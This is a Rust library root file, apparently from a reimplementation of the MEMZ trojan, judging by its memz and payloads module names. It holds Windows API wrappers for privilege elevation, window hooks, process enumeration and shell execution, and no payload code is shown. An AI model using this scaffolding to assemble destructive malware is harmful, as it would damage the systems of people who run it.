pub const LMEM_ZEROINIT: u8 = 0;

pub mod data;
pub mod memz;
pub mod ntdll;
pub mod payloads;
pub mod utils;

pub mod winapi_type {
    pub type DWORD = u32;
    pub type PDWORD = *mut u32;
    pub type PBYTE = *mut u8;
    pub type ULONG = u32;
    pub type BOOLEAN = u8;
    pub type PBOOLEAN = *mut u8;
}

pub mod convert_str {
    // https://github.com/microsoft/windows-rs/issues/973#issuecomment-1363481060
    use windows::core::{PCSTR, PCWSTR};

    pub struct PCWSTRWrapper {
        text: PCWSTR,
        // this is here to allow it to get dropped at the same time as the PCWSTR
        #[allow(unused)]
        _container: Vec<u16>,
    }

    impl std::ops::Deref for PCWSTRWrapper {
        type Target = PCWSTR;

        fn deref(&self) -> &Self::Target {
            &self.text
        }
    }

    pub trait ToPCWSTRWrapper {
        fn to_pcwstr(&self) -> PCWSTRWrapper;
    }

    impl ToPCWSTRWrapper for &str {
        fn to_pcwstr(&self) -> PCWSTRWrapper {
            // do not drop when scope ends, by moving it into struct
            let mut text = self.encode_utf16().collect::<Vec<_>>();
            text.push(0);

            PCWSTRWrapper {
                text: PCWSTR::from_raw(text.as_ptr()),
                _container: text,
            }
        }
    }

    impl ToPCWSTRWrapper for PCWSTR {
        fn to_pcwstr(&self) -> PCWSTRWrapper {
            PCWSTRWrapper {
                text: *self,
                _container: Vec::new(),
            }
        }
    }

    pub struct PCSTRWrapper {
        text: PCSTR,
        #[allow(unused)]
        _container: Vec<u8>,
    }

    impl std::ops::Deref for PCSTRWrapper {
        type Target = PCSTR;

        fn deref(&self) -> &Self::Target {
            &self.text
        }
    }

    pub trait ToPCSTRWrapper {
        fn to_pcstr(&self) -> PCSTRWrapper;
    }

    impl ToPCSTRWrapper for &str {
        fn to_pcstr(&self) -> PCSTRWrapper {
            // https://stackoverflow.com/questions/47980023/how-to-convert-from-u8-to-vecu8
            let mut text = self.as_bytes().to_vec();
            text.push(0); // add null

            PCSTRWrapper {
                text: PCSTR(text.as_ptr()),
                _container: text, // data lifetime management
            }
        }
    }

    impl ToPCSTRWrapper for PCSTR {
        fn to_pcstr(&self) -> PCSTRWrapper {
            PCSTRWrapper {
                text: *self,
                _container: Vec::new(),
            }
        }
    }
}

pub mod wrap_windows_api {
    use core::fmt;
    use std::{ffi::c_void, mem::size_of};

    use crate::convert_str::{ToPCSTRWrapper, ToPCWSTRWrapper};
    #[cfg(feature = "DEBUG_MODE")]
    use crate::utils::log::{write_log, LogType};
    use windows::{
        core::PCWSTR,
        imp::{GetProcAddress, LoadLibraryA},
        Win32::{
            Foundation::{
                CloseHandle, GetLastError, BOOL, ERROR_NOT_ALL_ASSIGNED, HANDLE, HMODULE, HWND,
                INVALID_HANDLE_VALUE, LUID,
            },
            Globalization::lstrcmpW,
            Security::{
                AdjustTokenPrivileges, LookupPrivilegeValueW, SE_PRIVILEGE_ENABLED,
                TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_PRIVILEGES_ATTRIBUTES,
                TOKEN_QUERY,
            },
            System::{
                Diagnostics::ToolHelp::{
                    CreateToolhelp32Snapshot, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
                },
                ProcessStatus::{GetModuleFileNameExA, GetProcessImageFileNameA},
                Threading::{
                    GetCurrentProcess, GetCurrentThreadId, OpenProcessToken, SetPriorityClass,
                    PROCESS_CREATION_FLAGS,
                },
            },
            UI::{
                Shell::ShellExecuteA,
                WindowsAndMessaging::{
                    GetMessageA, GetSystemMetrics, MessageBoxA, RegisterClassExA,
                    SetWindowsHookExA, UnhookWindowsHookEx, HHOOK, HOOKPROC, MESSAGEBOX_RESULT,
                    MESSAGEBOX_STYLE, MSG, SHOW_WINDOW_CMD, SM_CXSCREEN, SM_CYSCREEN,
                    SYSTEM_METRICS_INDEX, WINDOWS_HOOK_ID, WNDCLASSEXA,
                },
            },
        },
    };

    #[derive(Debug)]
    pub enum WinError {
        Failed,
        NoPermissions,
    }

    impl fmt::Display for WinError {
        fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
            write!(f, "{:?}", self)
        }
    }

    pub struct Resolution {
        pub scrw: i32,
        pub scrh: i32,
    }

    impl Resolution {
        fn new() -> Self {
            Self {
                scrw: Self::wrap_with_result(SM_CXSCREEN).unwrap(),
                scrh: Self::wrap_with_result(SM_CYSCREEN).unwrap(),
            }
        }

        fn wrap_with_result(nindex: SYSTEM_METRICS_INDEX) -> Result<i32, WinError> {
            unsafe {
                match GetSystemMetrics(nindex) {
                    // GetLastError() does not provide extended error
                    0 => {
                        eprintln!("Failed GetSystemMetrics function");
                        Err(WinError::Failed)
                    }
                    value => Ok(value),
                }
            }
        }
    }

    impl Default for Resolution {
        fn default() -> Self {
            Self::new()
        }
    }

    pub fn lstrcmp_w<T, U>(str1: T, str2: U) -> bool
    where
        T: ToPCWSTRWrapper,
        U: ToPCWSTRWrapper,
    {
        unsafe {
            let str1 = str1.to_pcwstr();
            let str2 = str2.to_pcwstr();

            let cmp = lstrcmpW(*str1, *str2);

            cmp != 0
        }
    }

    pub fn wrap_get_process_image_filename_a(fn_buf: &mut [u8]) -> Result<u32, WinError> {
        unsafe {
            match GetProcessImageFileNameA(GetCurrentProcess(), fn_buf) {
                0 => {
                    eprintln!("Failed to GetProcessImageFileNameA\n{:?}", GetLastError());
                    Err(WinError::Failed)
                }
                v => Ok(v),
            }
        }
    }

    pub fn wrap_create_toolhelp32_snapshot() -> Result<HANDLE, WinError> {
        unsafe {
            match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
                Ok(INVALID_HANDLE_VALUE) => {
                    eprintln!("Failed CreateToolhelp32Snapshot\n{:?}", GetLastError());
                    Err(WinError::Failed)
                }
                Ok(handle) => Ok(handle),
                _ => panic!(),
            }
        }
    }

    pub fn wrap_close_handle(h_object: HANDLE) -> Result<BOOL, WinError> {
        unsafe {
            match CloseHandle(h_object) {
                BOOL(0) => {
                    eprintln!("CloseHandle Error\n{:?}", GetLastError());
                    Err(WinError::Failed)
                }
                ret => Ok(ret),
            }
        }
    }

    pub fn wrap_process32_next(hsnapshot: HANDLE, lppe: &mut PROCESSENTRY32) -> bool {
        unsafe {
            match Process32Next(hsnapshot, lppe) {
                BOOL(1) => true,
                BOOL(0) => false,
                _ => panic!("Failed Process32Next()\nUnknown Error"),
            }
        }
    }

    pub fn wrap_set_windows_hook_ex_a(
        idhook: WINDOWS_HOOK_ID,
        lpfn: HOOKPROC,
        hmod: HMODULE,
        dwthreadid: u32,
    ) -> Result<HHOOK, WinError> {
        unsafe {
            match SetWindowsHookExA(idhook, lpfn, hmod, dwthreadid) {
                Err(e) => {
                    eprintln!(
                        "SetWindowsHookExA Error:\n{e:#?}\nGetLastError(): {:?}",
                        GetLastError()
                    );
                    Err(WinError::Failed)
                }
                Ok(h_handle) => Ok(h_handle),
            }
        }
    }

    pub fn wrap_get_current_thread_id() -> u32 {
        unsafe { GetCurrentThreadId() }
    }

    pub fn wrap_messagebox_a<T, U>(
        hwnd: HWND,
        lptext: T,
        lpcaption: U,
        utype: MESSAGEBOX_STYLE,
    ) -> Result<MESSAGEBOX_RESULT, WinError>
    where
        T: ToPCSTRWrapper,
        U: ToPCSTRWrapper,
    {
        let lptext = *lptext.to_pcstr();
        let lpcaption = *lpcaption.to_pcstr();
        unsafe {
            match MessageBoxA(hwnd, lptext, lpcaption, utype) {
                MESSAGEBOX_RESULT(0) => {
                    eprintln!("MessageBoxA Error\nGetLastError(): {:?}", GetLastError());
                    Err(WinError::Failed)
                }
                v => Ok(v),
            }
        }
    }

    pub fn wrap_unhook_windows_hook_ex(hhk: HHOOK) -> Result<bool, WinError> {
        unsafe {
            match UnhookWindowsHookEx(hhk) {
                BOOL(0) => {
                    eprintln!(
                        "UnhookWindowsHookEx Error\nGetLastError(): {:?}",
                        GetLastError()
                    );
                    Err(WinError::Failed)
                }
                v => Ok(v.as_bool()),
            }
        }
    }

    pub fn wrap_load_library_a<T>(name: T) -> Result<HMODULE, WinError>
    where
        T: ToPCSTRWrapper,
    {
        let name = *name.to_pcstr();
        unsafe {
            match LoadLibraryA(name) {
                0 => {
                    eprintln!("Failed LoadLibraryA\nGetLastError(): {:?}", GetLastError());
                    Err(WinError::Failed)
                }
                v => Ok(HMODULE(v)),
            }
        }
    }

    pub fn wrap_get_proc_address<T>(library: HMODULE, name: T) -> Result<*const c_void, WinError>
    where
        T: ToPCSTRWrapper,
    {
        let name = *name.to_pcstr();
        unsafe {
            let ret = GetProcAddress(library.0, name);
            if ret.is_null() {
                eprintln!(
                    "Failed GetProcAddress\nGetLastError(): {:?}",
                    GetLastError()
                );
                Err(WinError::Failed)
            } else {
                Ok(ret)
            }
        }
    }

    pub fn set_privilege<T>(lpsz_privilege: T, b_enabl_privilege: bool) -> Result<bool, WinError>
    where
        T: ToPCWSTRWrapper,
    {
        let lpsz_privilege = *lpsz_privilege.to_pcwstr();

        let mut h_token = HANDLE::default();
        let mut tp: TOKEN_PRIVILEGES = Default::default();
        let mut luid: LUID = Default::default();

        let lpv = unsafe { LookupPrivilegeValueW(PCWSTR::null(), lpsz_privilege, &mut luid) };
        let opt = unsafe {
            OpenProcessToken(
                GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                &mut h_token,
            )
        };
        if !(lpv.as_bool() && opt.as_bool()) {
            eprintln!(
                "Failed LookupPrivilegeValueA()\nGetLastError: {:?}",
                unsafe { GetLastError() }
            );
            return Err(WinError::Failed);
        }

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;

        if b_enabl_privilege {
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        } else {
            tp.Privileges[0].Attributes = TOKEN_PRIVILEGES_ATTRIBUTES(0);
        }

        let atp = unsafe {
            AdjustTokenPrivileges(
                h_token,
                BOOL(0),
                Some(&tp),
                size_of::<TOKEN_PRIVILEGES>() as u32,
                None,
                None,
            )
        };

        if !atp.as_bool() {
            #[cfg(not(feature = "DEBUG_MODE"))]
            eprintln!(
                "Failed AdjustTokenPrivileges()\nGetLastError: {:?}",
                unsafe { GetLastError() }
            );

            #[cfg(feature = "DEBUG_MODE")]
            write_log(
                LogType::ERROR,
                "Failed AdjustTokenPrivileges()\nGetLastError: {:?}",
                unsafe { GetLastError() },
            );

            return Err(WinError::Failed);
        }

        unsafe {
            if GetLastError() == ERROR_NOT_ALL_ASSIGNED {
                #[cfg(not(feature = "DEBUG_MODE"))]
                eprintln!("The token does not have the specified privilege.\n");

                #[cfg(feature = "DEBUG_MODE")]
                write_log(
                    LogType::ERROR,
                    "The token does not have the specified privilege.\n",
                );

                return Err(WinError::NoPermissions);
            }
        }
        #[cfg(feature = "DEBUG_MODE")]
        dbg!(&tp);

        Ok(true)
    }

    pub fn wrap_register_class_ex_a(param0: &WNDCLASSEXA) -> Result<u16, WinError> {
        unsafe {
            match RegisterClassExA(param0) {
                0 => {
                    #[cfg(not(feature = "DEBUG_MODE"))]
                    eprintln!(
                        "Failed RegisterClassExA()\nGetLastError: {:?}",
                        GetLastError()
                    );
                    #[cfg(feature = "DEBUG_MODE")]
                    write_log(
                        LogType::ERROR,
                        format!(
                            "Failed RegisterClassExA()\nGetLastError: {:?}",
                            GetLastError()
                        ),
                    );
                    Err(WinError::Failed)
                }
                v => Ok(v),
            }
        }
    }

    pub fn wrap_get_message(
        lpmsg: &mut MSG,
        hwnd: HWND,
        wmsgfiltermin: u32,
        wmsgfiltermax: u32,
    ) -> Result<bool, WinError> {
        unsafe {
            match GetMessageA(lpmsg, hwnd, wmsgfiltermin, wmsgfiltermax) {
                BOOL(-1) => {
                    #[cfg(not(feature = "DEBUG_MODE"))]
                    eprintln!("Failed GetMessageA()\nGetLastError: {:?}", GetLastError());

                    #[cfg(feature = "DEBUG_MODE")]
                    write_log(
                        LogType::ERROR,
                        format!("Failed GetMessageA()\nGetLastError: {:?}", GetLastError()),
                    );

                    Err(WinError::Failed)
                }
                v => Ok(v.as_bool()),
            }
        }
    }

    pub fn wrap_get_module_file_name(
        hprocess: HANDLE,
        hmodule: HMODULE,
        lpfilename: &mut [u8],
    ) -> Result<u32, WinError> {
        unsafe {
            match GetModuleFileNameExA(hprocess, hmodule, lpfilename) {
                0 => {
                    #[cfg(not(feature = "DEBUG_MODE"))]
                    eprintln!(
                        "Failed GetModuleFileNameExA()\nGetLastError: {:?}",
                        GetLastError()
                    );
                    #[cfg(feature = "DEBUG_MODE")]
                    write_log(
                        LogType::ERROR,
                        format!(
                            "Failed GetModuleFileNameExA()\nGetLastError: {:?}",
                            GetLastError()
                        ),
                    );
                    Err(WinError::Failed)
                }
                v => Ok(v),
            }
        }
    }

    pub fn wrap_shell_execute_a<P1, P2, P3, P4>(
        hwnd: HWND,
        lpoperation: P1,
        lpfile: P2,
        lpparameters: P3,
        lpdirectory: P4,
        nshowcmd: SHOW_WINDOW_CMD,
    ) -> Result<HMODULE, WinError>
    where
        P1: ToPCSTRWrapper,
        P2: ToPCSTRWrapper,
        P3: ToPCSTRWrapper,
        P4: ToPCSTRWrapper,
    {
        let p1 = *lpoperation.to_pcstr();
        let p2 = *lpfile.to_pcstr();
        let p3 = *lpparameters.to_pcstr();
        let p4 = *lpdirectory.to_pcstr();
        unsafe {
            let res = ShellExecuteA(hwnd, p1, p2, p3, p4, nshowcmd);

            match res {
                HMODULE(0..=31) => {
                    #[cfg(not(feature = "DEBUG_MODE"))]
                    eprintln!("ShellExecuteA failed with error code: {:?}", res);
                    #[cfg(feature = "DEBUG_MODE")]
                    write_log(
                        LogType::ERROR,
                        format!("ShellExecuteA failed with error code: {:?}", res),
                    );
                    Err(WinError::Failed)
                }
                v => {
                    #[cfg(feature = "DEBUG_MODE")]
                    write_log(LogType::INFO, "ShellExecuteA succeeded");
                    Ok(v)
                }
            }
        }
    }

    pub fn wrap_set_priority_class(
        h_process: HANDLE,
        dw_priority_class: u32,
    ) -> Result<bool, WinError> {
        unsafe {
            match SetPriorityClass(h_process, PROCESS_CREATION_FLAGS(dw_priority_class)) {
                BOOL(0) => {
                    #[cfg(not(feature = "DEBUG_MODE"))]
                    eprintln!(
                        "SetPriorityClass failed with GetLastError():\n: {:?}",
                        GetLastError()
                    );
                    #[cfg(feature = "DEBUG_MODE")]
                    write_log(
                        LogType::ERROR,
                        format!(
                            "SetPriorityClass failed with GetLastError():\n {:?}",
                            GetLastError()
                        ),
                    );
                    Err(WinError::Failed)
                }
                v => Ok(v.as_bool()),
            }
        }
    }
}
